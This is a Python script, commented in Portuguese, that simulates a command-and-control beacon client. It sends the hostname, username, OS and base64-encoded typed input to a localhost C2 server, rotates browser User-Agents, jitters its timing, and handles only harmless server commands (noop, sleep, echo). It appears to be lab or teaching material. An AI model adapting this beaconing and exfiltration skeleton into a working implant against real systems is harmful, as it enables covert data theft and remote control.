import time
import requests
import random
import base64
import json
import socket
import getpass
import platform

# Endereço do C2
C2_URL = "http://127.0.0.1:8080"

# User-Agents realistas
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64)",
]

# Metadados do host (simulado)
HOSTNAME = socket.gethostname()
USERNAME = getpass.getuser()
OS = platform.system()

# Intervalo padrão de beacon (pode ser ajustado pelo C2)
beacon_sleep = random.randint(5, 15)

print("[*] Cliente ativo (C2 bidirecional simulado)")
print("[*] Digite dados para exfiltrar | 'exit' para sair\n")

def handle_c2_response(resp_json):
    """
    Interpreta respostas do C2 de forma INOFENSIVA.
    Ações permitidas:
      - noop  : não faz nada
      - sleep : ajusta intervalo de beacon
      - echo  : imprime mensagem
    """
    global beacon_sleep

    action = resp_json.get("action", "noop")

    if action == "sleep":
        new_sleep = resp_json.get("sleep", beacon_sleep)
        if isinstance(new_sleep, int) and 1 <= new_sleep <= 60:
            beacon_sleep = new_sleep
            print(f"[C2] Ação: sleep -> novo intervalo = {beacon_sleep}s")
        else:
            print("[C2] Sleep inválido, mantendo intervalo atual")

    elif action == "echo":
        msg = resp_json.get("message", "")
        print(f"[C2] Echo: {msg}")

    elif action == "noop":
        print("[C2] Noop (nenhuma ação)")

    else:
        print(f"[C2] Ação desconhecida: {action}")

while True:
    user_input = input("> ")

    if user_input.lower() == "exit":
        print("[*] Encerrando cliente.")
        break

    # Ofuscação simples (Base64)
    encoded_data = base64.b64encode(user_input.encode()).decode()

    # Beacon estruturado
    beacon = {
        "host": HOSTNAME,
        "user": USERNAME,
        "os": OS,
        "data": encoded_data,
        "status": "ok"
    }

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(
            C2_URL,
            data=json.dumps(beacon),
            headers=headers,
            timeout=3
        )

        print("[+] Beacon enviado")

        # --- NOVO: leitura da resposta do C2 ---
        if response.headers.get("Content-Type") == "application/json":
            resp_json = response.json()
            handle_c2_response(resp_json)
        else:
            print("[C2] Resposta não-JSON")

    except Exception as e:
        print(f"[!] Falha no envio: {e}")

    time.sleep(beacon_sleep)